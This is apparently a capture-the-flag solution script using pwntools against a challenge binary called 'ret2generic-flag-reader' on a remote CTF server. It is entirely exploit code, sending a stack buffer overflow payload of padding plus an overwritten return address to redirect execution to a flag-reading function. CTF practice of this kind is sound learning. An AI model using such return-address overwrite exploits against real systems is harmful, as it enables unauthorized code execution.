from pwn import *

#io = process("./ret2generic-flag-reader")
io = remote('mc.ax', 31077)

payload = b""
payload += b"A"*32 + b"B"*8
payload += p64(0x00000000004011f6)

io.sendlineafter("what do you think?", payload)
io.interactive()
